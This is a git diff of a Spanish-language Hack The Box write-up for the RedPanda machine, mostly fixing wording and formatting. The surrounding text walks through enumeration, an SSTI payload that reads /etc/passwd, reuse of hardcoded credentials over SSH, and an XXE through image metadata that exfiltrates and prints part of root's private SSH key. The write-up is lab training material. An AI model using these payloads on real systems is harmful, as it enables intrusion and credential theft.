@@ -46,7 +46,7 @@ image:
 ----
 
 ## Enumeración
-Comenzamos realizando un escaneo con nmap a la máquina victima:
+Comenzamos realizando un escaneo con `nmap` a la máquina víctima:
 
 ```shell
 Nmap 7.92 scan initiated Sun Jul 10 15:52:39 2022 as: nmap -p- -sCV -sS --min-rate 5000 --open -Pn -vvv -n -oN scope.txt 10.10.11.170
@@ -126,7 +126,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Jul 10 15:54:31 2022 -- 1 IP address (1 host up) scanned in 112.04 seconds
 ```
 
-Solamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). Como de momento no contamos con usuarios ni credenciales para conectarnos por SSH, vamos a enumerar el puerto 8080. Iniciemos usando la herramienta _whatweb_ y ver qué nos reporta:
+Solamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). De momento no contamos con usuarios ni credenciales para conectarnos a través de SSH. Vamos a enumerar el puerto 8080. Iniciemos usando la herramienta `whatweb` y ver qué nos reporta:
 
 ```shell
 ❯ whatweb http://10.10.11.170:8080 
@@ -134,16 +134,16 @@ http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ]
 ```
 
 ### Buscando pandas rojos
-Nos nos dice gran cosa además de ver que se está empleando _Spring Boot_ un framework de Java, también podemos ver lo mismo en el reporte que nos hizo nmap. Procedamos a visualizar la web en nuestro navegador:
+No nos dice gran cosa, además de ver que se está empleando `Spring Boot` un framework de _Java_. También podemos ver lo mismo en el reporte que nos hizo `nmap`. Procedamos a visualizar la web en nuestro navegador:
 ![Web RedPanda](/assets/favicon/2022-11-26/redPanda1.png)
 
-Como vimos en el reporte que nos hizo whatweb, sabemos que es un buscador de pandas rojos, bueno, vamos a buscar pandas rojos, obviamente:
+Como vimos en el reporte que nos hizo `whatweb`, sabemos que es un buscador de pandas rojos. Bueno, vamos a buscar pandas rojos, obviamente:
 ![Web RedPanda](/assets/favicon/2022-11-26/redPanda2.png)
 
-Ese panda se ve un poco surreal. Ahora, que tal si probamos alguna inyección tipica como SQL, XSS, LFI, etc. No sucede nada, pero sabemos que se está empleando Java, y puede darnos un indicio para intentar probar un payload para inyectar código malicioso. Veamos lo que sucede:
+—Ese panda se ve un poco surreal—. Ahora ¿Qué tal si probamos alguna inyección tipica como SQL, XSS, LFI, etc? No sucede nada, pero sabemos que se está empleando _Java_, y puede darnos un indicio para intentar probar un _payload_ para inyectar código malicioso. Veamos lo que sucede:
 ![Web RedPanda](/assets/favicon/2022-11-26/redPanda3.png)
 
-Nos está baneando algún caracter especial \[\$\*{}\] así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje, en mi caso usaré wfuzz de la siguiente manera:
+Nos está baneando algún caracter especial (`[$*{}]`), así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje. En mi caso usaré `wfuzz` de la siguiente manera:
 
 ```shell
 ❯ wfuzz -c --ss 'banned characters' -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'name=FUZZ' http://10.10.11.170:8080/search
@@ -168,7 +168,7 @@ Filtered Requests: 29
 Requests/sec.: 14.27047
 ```
 
-Se destaca el comando _--ss_ el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (banned characters) en la respuesta. Vemos que hay 3 caracteres especiales que se nos están bloqueando, no podremos usarlos, sin embargo; el diccionario tiene 32 caracteres, no quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están baneando:
+Se destaca el comando `--ss`, el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (`banned characters`) en la respuesta. Vemos que hay 3 caracteres especiales que están siendo bloqueados. No podremos usarlos; sin embargo, el diccionario tiene 32 caracteres, nos quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están bloqueando:
 
 ```shell
 ❯ grep -vE '~|\$|_' /usr/share/SecLists/Fuzzing/special-chars.txt > $(pwd)/dict.txt 
@@ -181,18 +181,18 @@ Ahora podemos hacer un script para verificar con qué caracteres obtendremos un 
 ```
 
 ## Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos
-Es probable que no sea tan practico, pero al ejecutarlo nos muestra dos caracteres \[@\*\], los cuales devuelven en la respuesta el número _49_. Teniendo dos caracteres para probar código, es cuando podemos buscar un payload bien diseñado para ejecutar comandos, en este caso he usado este payload del recurso [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java):
+Es probable que no sea tan práctico, pero al ejecutarlo nos muestra dos caracteres (`@*`), los cuales devuelven en la respuesta el número `49`. Teniendo dos caracteres para probar código, es cuando podemos buscar un payload bien diseñado para ejecutar comandos. En este caso he usado este payload del recurso [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java):
 
 >
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 
 
-Para usar el anterior payload, debemos cambiar el _\$_ por alguno de los caracteres obtenidos anteriormente. Cuando probamos a usar _\@_ no nos muestra nada, pero al usar el _\*_, obtenemos:
+Para usar el anterior payload, debemos cambiar el caracter `$` por alguno de los otros caracteres obtenidos anteriormente. Cuando probamos a usar el caracter `@`, no observamos nada, pero al usar el caracter `*`, obtenemos:
 ![Web redPanda SSTI](/assets/favicon/2022-11-26/redPanda4.png)
 
 ### Obteniendo una shell como el usuario woodenk
 
-Ahora podemos pensar que hacer el proceso del payload anterior para ejecutar comandos puede ser una tarea repetitiva y extenuante, será mejora hacer un script que nos ayude a convertir cada caracter de una cadena en un número, basandonos en el payload anterior. En mi caso hice un script en python3:
+Ahora podemos pensar que hacer el proceso del payload anterior para ejecutar comandos puede ser una tarea repetitiva y extenuante. Será mejor hacer un script que nos ayude a convertir cada caracter de una cadena en un número basándonos en el payload anterior. En mi caso hice un script en python:
 
 ```python
 from bs4 import BeautifulSoup
@@ -241,7 +241,7 @@ if __name__ == "__main__":
    main()
 ```
 
-Estamos ejecutando comandos como el usuario _woodenk_. El anterior script simula una terminal, pero tiene muchas limitaciones, no podemos entablarnos una revershell funcional por el momento. Haciendo enumeración básica y viendo los procesos, nos encontramos con lo siguiente:
+Estamos ejecutando comandos como el usuario `woodenk`. El anterior script simula una terminal, pero tiene muchas limitaciones, no podemos entablarnos una revershell funcional por el momento. Haciendo enumeración básica y viendo los procesos, nos encontramos con lo siguiente:
 
 ```shell
 > ps -aux
@@ -293,7 +293,13 @@ woodenk    31892  0.0  0.2   8308  4952 pts/0    Ss   23:38   0:00 -bash
 woodenk    31936  0.0  0.1   9080  3568 pts/0    R+   23:40   0:00 ps -aux
 ```
 
-Vemos un proceso interesante, el cual tiene el PID  _880_, vemos que root está ejecutando como el usuario _woodenk_ lo siguiente `java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`. Ahora, recordemos nuevamente que se está empleando _Spring Boot_, así que debe tener una estructura como cualquier proyecto. He encontrado este [artículo](https://studygyaan.com/spring-boot/spring-boot-project-folder-structure-and-best-practices) donde nos muestran una estructura que se puede emplear en algunos proyectos, podemos ver archivos _controladores o controller_, a veces podemos encontrar credenciales en esos lugares. Vamos a revisar la ruta _/opt/panda_search_:
+Vemos un proceso interesante, el cual tiene el `PID 880`, vemos que el usuario `root` está ejecutando como el usuario `woodenk` lo siguiente:
+
+```shell
+java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`
+```
+
+Ahora, recordemos nuevamente que se está empleando _Spring Boot_, así que debe tener una estructura como cualquier proyecto. He encontrado este [artículo](https://studygyaan.com/spring-boot/spring-boot-project-folder-structure-and-best-practices) donde nos muestran una estructura que se puede emplear en algunos proyectos. Podemos ver archivos _controladores_ o _controller_. A veces podemos encontrar credenciales en esos lugares. Vamos a revisar la ruta `/opt/panda_search`:
 
 ```shell
 > ls -la /opt/panda_search/src/main/java/com/panda_search/htb/panda_search
@@ -305,7 +311,7 @@ drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
 -rw-rw-r-- 1 root root 1800 Jun 14 14:09 RequestInterceptor.java
 ```
 
-Tuve que profundizar en las rutas, pero aquí terminan los directorios para este lugar, revisemos entonces el controlador:
+Tuve que profundizar en las rutas pero aquí terminan los directorios para este lugar, revisemos entonces el controlador:
 
 ```java
 import java.util.ArrayList;
@@ -423,22 +429,22 @@ public class MainController {
 }
 ```
 
-Vemos un método _filter_ el cual nos impedía escribir esos 4 caracteres que están en el arreglo _no\_no\_words_, pero lo más importante es que tenemos credenciales con el usuario _woodenk_
+Vemos un método `filter` el cual nos impedía escribir esos 4 caracteres que están en el arreglo `no_no_words`, pero lo más importante es que tenemos credenciales con el usuario `woodenk`:
 ```java 
 conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
 ```
 
-¿Qué tal si se están reutilizando? Intentemos conectarnos por SSH:
+—¿Qué tal si se están reutilizando?— Intentemos conectarnos a través de SSH:
 ```shell
 ❯ ssh woodenk@10.10.11.170
 woodenk@10.10.11.170\'s password: RedPandazRule
 ```
 
-Ganamos acceso con una shell funcional!
+¡Ganamos acceso con una shell funcional!
 
 ## Escalando privilegios
 ### Analizando procesos con pspy
-Haciendo un reconocimiento básico no encontramos nada de lo que nos podamos aprovechar, así que he optado por usar pspy para analizar procesos, entre los más relevantes encontramos:
+Haciendo un reconocimiento básico, no encontramos nada de lo que nos podamos aprovechar, así que he optado por usar `pspy` para analizar procesos. Entre los más relevantes encontramos:
 ```shell
 CMD: UID=0    PID=2040   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
 CMD: UID=1000 PID=2051   | /bin/bash /opt/cleanup.sh 
@@ -451,12 +457,12 @@ CMD: UID=1000 PID=2049   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ;
 CMD: UID=1000 PID=2050   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
 ```
 
-root está ejecutando un script como el usuario _woodenk_, y vemos lo que hace el script (también podríamos verlo directamente con _cat_), además se están eliminando archivos _.jpg_ y _.xml_
+`root` está ejecutando un script como el usuario `woodenk` y vemos lo que hace el script —también podríamos verlo directamente con `cat`—. Además, se están eliminando archivos con extensión`.jpg` y `.xml`.
 
 ### Analizando código en Java y explotando un XXE
-Anteriormente hemos visto que root está ejecutando el campilado del proyecto `java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`, (también aparece en lo que nos reporta pspy). Revisando un poco la ruta _/opt/_ tambíen encontramos un directorio llamado _logParser_, el cual contiene un archivo interesante, parece de la applicación web.
+Anteriormente hemos visto que el usuario `root` está ejecutando el compilado del proyecto `java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`, —también aparece en lo que nos reporta `pspy`—. Revisando un poco la ruta `/opt/` tambíen encontramos un directorio llamado `logParser`, el cual contiene un archivo interesante: parece de la applicación web.
 
-Revisando un poco el código vemos que se está escribiendo un archivo xml, seguro es para exportarlo. Además del código anterior, también hemos encontrado un archivo de logs:
+Revisando un poco el código, vemos que se está escribiendo un archivo `xml`, —seguro es para exportarlo—. Además del código anterior, también hemos encontrado un archivo de `logs`:
 
 ```shell
 woodenk@redpanda:/opt/panda_search$ cat redpanda.log
@@ -479,9 +485,9 @@ Si volvemos a revisar el archivo de logs, nos aprece la petición:
 200||10.10.16.18||curl/7.84.0||/
 ```
 
-En el código Java encontrado podemos visualizar cómo se está parseando la información, además vemos que lee los logs y realiza ciertas acciones. Si tenemos el control del input en esta parte, podríamos inyectar código. Comentaré el código según los parametros que enviaré para una mejor comprensión.
+En el código _Java_ encontrado, podemos visualizar cómo se está parseando la información. Además vemos que lee los `logs` y realiza ciertas acciones. Si tenemos el control del input en esta parte, podríamos inyectar código. Comentaré el código según los parámetros que enviaré para una mejor comprensión.
 
-Recordemos que todas las aplicaciones Java comienzan ejecutando la función _main_:
+> Recordemos que todas las aplicaciones Java comienzan ejecutando la función `main`:
 {: .prompt-info}
 
 ```java
@@ -652,7 +658,7 @@ public class App {
 }
 ```
 
-Procedamos a decargar cualquier imagen en nuestro equipo y agregar un tag "Artist" a la metada:
+Procedamos a decargar cualquier imagen en nuestro equipo y agregar el tag "Artist" a la metadata:
 ```shell
 ❯ exiftool -Artist="/../../../../../../home/woodenk/linux.jpg"
 ```
@@ -672,7 +678,7 @@ Y ahora creamos el archivo XML malicioso:
 </credits>
 ```
 
-Ambos archivos los transferimos a la maquina victima, ambos archivos los movemos al directorio home de _woodenk_. Ahora simplemente realizamos una petición desde nuestro equipo:
+Ambos archivos los transferimos a la máquina víctima. Ambos archivos los movemos al directorio home de `woodenk`. Ahora simplemente realizamos una petición desde nuestro equipo:
 ```shell
 curl http://10.10.11.170 -H 'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'
 ```
@@ -682,7 +688,7 @@ Ahora, verifiquemos cambios en el archivo:
 woodenk@redpanda: watch -n0 cat new_creds.xml
 ```
 
-Después de un tiempo nos aparece lo siguiente:
+Después de un tiempo, nos aparece lo siguiente:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE replace [
@@ -704,7 +710,7 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 </credits>
 ```
 
-Tenemos la id_rsa privada de root, la guardamos en un archivo, le damos permiso _600_ y procedemos a conectarnos como este usuario:
+Tenemos la `id_rsa` del usuario `root`. La guardamos en un archivo, le damos permisos `600` y procedemos a conectarnos como este usuario:
 
 ```shell
 ❯ chmod 600 id_rsa
